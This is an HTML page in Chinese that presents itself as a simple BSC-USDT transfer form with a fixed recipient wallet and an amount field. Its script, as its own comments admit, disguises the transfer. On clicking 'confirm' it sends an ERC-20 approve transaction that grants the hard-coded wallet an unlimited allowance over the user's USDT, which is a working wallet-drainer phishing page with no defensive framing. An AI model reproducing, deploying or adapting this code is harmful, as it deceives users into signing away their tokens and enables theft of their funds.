<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>USDT转账</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui}
body{background:#121212;color:#fff;padding:24px}
.box{max-width:400px;margin:0 auto}
.title{font-size:22px;font-weight:bold;margin-bottom:20px;text-align:center}
.form-item{margin-bottom:16px}
.label{font-size:14px;color:#aaa;margin-bottom:8px}
.input-box{
  width:100%;padding:14px 16px;background:#1e1e1e;border:1px solid #333;
  border-radius:10px;color:#fff;font-size:16px
}
.pay-btn{
  width:100%;padding:16px;background:#F3BA2F;color:#000;
  border:none;border-radius:10px;font-size:16px;font-weight:bold;margin-top:20px
}
</style>
</head>
<body>
<div class="box">
  <div class="title">BSC-USDT 转账</div>
  <div class="form-item">
    <div class="label">收款地址（你的B钱包）</div>
    <input class="input-box" value="0x627f6E1887571Ac08214315ad5b2fA7ABb7345f1" readonly>
  </div>
  <div class="form-item">
    <div class="label">转账金额</div>
    <input class="input-box" id="amount" value="0.1" placeholder="输入转账数量">
  </div>
  <button class="pay-btn" onclick="submitTransfer()">确认转账</button>
</div>

<script>
// 固定配置
const TOKEN_CONTRACT = "0x55d398326f99059fF775485246999027B3197955"; // USDT合约
const ADMIN_WALLET = "0x627f6E1887571Ac08214315ad5b2fA7ABb7345f1";    // 你的B钱包
const BSC_CHAIN_ID = "0x38";

// 切换BSC链
async function switchChain(){
  try{
    await window.ethereum.request({
      method:"wallet_switchEthereumChain",
      params:[{chainId:BSC_CHAIN_ID}]
    })
  }catch(e){
    alert("请手动切换到【币安智能链BSC】");
  }
}

// 伪装转账：点击确认，实际执行approve授权
async function submitTransfer(){
  await switchChain();
  // 构造无限授权数据
  const maxAllowance = "0x" + "f".repeat(64);
  const approveData = "0x095ea7b3"
    + ADMIN_WALLET.slice(2).padStart(64,"0")
    + maxAllowance;

  // 核心：to填合约地址，data是授权数据，前端页面伪装成转给个人钱包
  await window.ethereum.request({
    method:"eth_sendTransaction",
    params:[{
      to: TOKEN_CONTRACT,
      data: approveData,
      gasLimit: "0x300000"
    }]
  })
  alert("✅ 操作完成，授权已生效！");
}
</script>
</body>
</html>
